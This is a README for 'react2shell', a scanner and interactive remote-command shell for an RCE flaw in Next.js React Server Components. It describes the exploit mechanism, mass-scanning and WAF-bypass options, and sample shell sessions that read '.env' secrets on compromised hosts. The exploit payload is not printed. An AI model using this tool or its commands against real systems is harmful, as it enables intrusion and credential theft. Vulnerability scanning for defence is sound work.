# react2shell

Scanner and interactive RCE shell for CVE-2025-55182 / CVE-2025-66478 in Next.js React Server Components.

## How It Works

Both tools send crafted multipart POST requests containing an RCE payload that executes commands via Node.js `child_process.execSync`. The command output is reflected in the `X-Action-Redirect` response header.

The **scanner** runs a deterministic check (`41*271 = 11111`) across many hosts. The **interactive shell** lets you run arbitrary commands on a single target.

## Requirements

- Python 3.9+
- [uv](https://docs.astral.sh/uv/) (recommended) or pip

## Installation

### uv (recommended)

```sh
uv tool install https://github.com/ogpourya/react2shell.git
```

This installs two commands:
- `react2shell` — scanner
- `react2shell-interactive` — interactive shell

### pip

```sh
pip install -r requirements.txt
```

## Scanner

Scan targets for the RCE vulnerability:

```sh
react2shell -u https://example.com
react2shell -l hosts.txt
react2shell -l hosts.txt -t 20 -o results.json
```

### Scanner options

```
-u, --url         Single URL to check
-l, --list        File containing hosts (one per line)
-t, --threads     Number of concurrent threads (default: 10)
--timeout         Request timeout in seconds (default: 10)
-o, --output      Output file for results (JSON)
--all-results     Save all results, not just vulnerable
-k, --insecure    Disable SSL verification
-H, --header      Custom header (can be used multiple times)
-v, --verbose     Show response details
-q, --quiet       Only show vulnerable hosts
--no-color        Disable colored output
--safe-check      Safe side-channel detection (no RCE)
--windows         Windows PowerShell payload
--waf-bypass      Add junk data to bypass WAF inspection
--waf-bypass-size Size of junk data in KB (default: 128)
--path            Custom path to test
--path-file       File containing paths to test
```

## Interactive Shell

A prompt_toolkit-based interactive shell for executing commands on a vulnerable target.

```sh
react2shell-interactive https://example.com
```

Or without arguments (prompts for URL):

```sh
react2shell-interactive
```

Once connected, it works like a normal shell:

```
 example.com ~ % whoami
  [16:44:30] exec `whoami`
  root
  [16:44:30] ok (1 attempt)
 example.com ~ % cd /tmp
 example.com /tmp % ls -la
```

### Commands

| Input | Action |
|---|---|
| `url <URL>` | Set target URL (probes vulnerability) |
| `cd <path>` | Change remote working directory |
| `<command>` | Execute on target (bare words work) |
| `!<command>` | Also executes on target |
| `retry` | Retry last command |
| `info` | Show session info |
| `history` | Show command history |
| `set <key> <value>` | Set option (timeout, verify, windows) |
| `clear` | Clear screen |
| `help` | Show help |
| `exit` / `quit` | Exit |
| `Ctrl+C` | Cancel current line |
| `Ctrl+D` | Exit shell |

### Session persistence

State (URL, working directory, timeout, mode) is saved to `.interactive_state` and restored on restart. The target is re-probed on restore — if no longer vulnerable, the session is discarded.

### Examples

```
 example.com ~ % whoami
 example.com ~ % id
 example.com ~ % cd /var/www
 example.com /var/www % ls
 example.com /var/www % cat .env
 example.com /var/www % cd /tmp
 example.com /tmp % uname -a
```

### Retry

Failed commands auto-retry up to 5 times with exponential backoff (2s, 4s, 6s, 8s, 10s). Use `retry` to retry the last command manually.

## Credits

RCE PoC originally disclosed by [@maple3142](https://x.com/maple3142).

- Assetnote Security Research Team — [Adam Kues, Tomais Williamson, Dylan Pindur, Patrik Grobshäuser, Shubham Shah](https://x.com/assetnote)
- [xEHLE_](https://x.com/xEHLE_) — RCE output reflection in response header
- [Nagli](https://x.com/galnagli)
